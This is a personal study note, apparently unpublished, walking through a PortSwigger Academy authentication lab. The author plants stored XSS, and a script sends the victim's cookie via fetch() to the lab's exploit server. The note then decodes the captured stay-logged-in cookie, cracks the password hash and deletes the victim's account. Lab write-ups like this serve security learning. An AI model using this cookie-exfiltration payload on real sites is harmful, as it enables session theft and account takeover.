---
post_group: cybersecurity-study-notes
title: PortSwigger Academy notes - Authentication
published: false
---

1. Log in as wiener:peter
2. I tried adding a comment with <script>alert('xss')</script> and it actually worked. Zero effort...
3. Since HttpOnly is not set, the cookie can be obtained with JS document.cookie.
4. There is an exploit server in the lab! How neat. Let's send the cookie to the server.
5. I can make a get request with the cookie as a parameter. How do I target specifically carlos? Weirdly enough the 'My account' link has the username written on it. I'll just get the element and parse it.
6. Even if requests are blocked by CORS, it still works
```
<script>
document.querySelector('a[href^="/my-account?id="]').href.includes('carlos') ? fetch('https://exploit-0a9e00c6046d9469c0b90939013c009f.web-security-academy.net/exploit?cookie=' + document.cookie) : null
</script>
```
7. Good enough, I got this:
```
10.0.4.148      2022-06-20 12:11:46 +0000 "GET /exploit?cookie=secret=2d1hi2Xo3bCUPdqpDfu7o1qwswaZoFSg;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
```
```
echo 'Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz' | base64 --decode
carlos:26323c16d5f4dabff3bb136f2460a943
```
8. Just like the text hinted, I just tried pasting the hash in google and got 'onceuponatime'
9. I log in using carlos:onceuponatime and click "Delete account"
10. Done!